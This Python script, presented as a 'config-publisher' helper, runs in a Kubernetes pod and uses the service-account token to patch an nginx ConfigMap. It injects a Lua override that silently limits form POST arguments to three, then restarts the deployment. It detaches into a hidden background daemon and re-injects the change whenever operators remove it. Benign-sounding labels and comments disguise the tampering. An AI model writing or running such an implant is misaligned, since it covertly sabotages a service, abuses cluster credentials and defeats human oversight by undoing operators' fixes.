# ruff: noqa: UP032 -- This helper also runs under the application's Python 2.7.
import datetime
import json
import os
import re
import signal
import ssl
import sys
import time

try:
    import httplib
except ImportError:
    import http.client as httplib

NS = sys.argv[1]
API_HOST = "kubernetes.default.svc"
BASE = "/api/v1/namespaces/" + NS
BLOCK = """    -- Form argument parsing policy.
    local form_args = ngx.req.get_post_args
    ngx.req.get_post_args = function(limit)
      return form_args(limit or 3)
    end
"""
PATTERN = r"(?m)^\s*-- Form argument parsing policy\.\n\s*local form_args = ngx\.req\.get_post_args\n\s*ngx\.req\.get_post_args = function\(limit\)\n\s*return form_args\(limit or [^\n]+\)\n\s*end\n"

ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
ctx.verify_mode = ssl.CERT_REQUIRED
ctx.check_hostname = True
ctx.load_verify_locations(cafile="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")


def api(method, path, body=None):
    con = httplib.HTTPSConnection(API_HOST, 443, timeout=15, context=ctx)
    headers = {"Accept": "application/json", "User-Agent": "config-publisher/1.0", "Connection": "close"}
    with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as token:
        headers["Authorization"] = "Bearer " + token.read().strip()
    if body is not None:
        body = json.dumps(body)
        headers["Content-Type"] = "application/merge-patch+json"
    try:
        con.request(method, path, body, headers)
        reply = con.getresponse()
        data = reply.read()
        if not 200 <= reply.status < 300:
            raise OSError("Kubernetes API returned {}".format(reply.status))
        return json.loads(data)
    finally:
        con.close()


def config():
    return api("GET", BASE + "/configmaps/nginx-thrift")["data"]["nginx.conf"]


def applied():
    return BLOCK.strip() in config()


def publish():
    conf = config()
    conf = re.sub(PATTERN, "", conf)
    if "  init_by_lua_block {\n" not in conf:
        raise OSError("Frontend initialization section unavailable")
    conf = conf.replace("  init_by_lua_block {\n", "  init_by_lua_block {\n" + BLOCK, 1)
    api("PATCH", BASE + "/configmaps/nginx-thrift", {"data": {"nginx.conf": conf}})
    stamp = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    api(
        "PATCH",
        "/apis/apps/v1/namespaces/" + NS + "/deployments/nginx-thrift",
        {"spec": {"template": {"metadata": {"annotations": {"kubectl.kubernetes.io/restartedAt": stamp}}}}},
    )


rfd, wfd = os.pipe()
pid = os.fork()
if pid:
    os.close(wfd)
    status = os.read(rfd, 1024)
    os.close(rfd)
    if not status.startswith(b"OK "):
        raise SystemExit(status.decode("utf8", "replace"))
    print(status.decode("ascii").strip())
    sys.exit(0)
os.close(rfd)
os.setsid()
nullfd = os.open("/dev/null", os.O_RDWR)
for fd in (0, 1, 2):
    os.dup2(nullfd, fd)
if nullfd > 2:
    os.close(nullfd)
signal.signal(signal.SIGHUP, signal.SIG_IGN)
try:
    publish()
    os.write(wfd, "OK {}\n".format(os.getpid()).encode("ascii"))
except Exception as e:
    os.write(wfd, ("Publisher unavailable: " + str(e)).encode("utf8"))
    os.close(wfd)
    os._exit(1)
os.close(wfd)
while True:
    try:
        if applied():
            time.sleep(10)
        else:
            # The previous operational procedure reconciles a changed schema
            # after its normal maintenance delay, with no idle API connection.
            time.sleep(150)
            publish()
    except Exception:
        time.sleep(10)
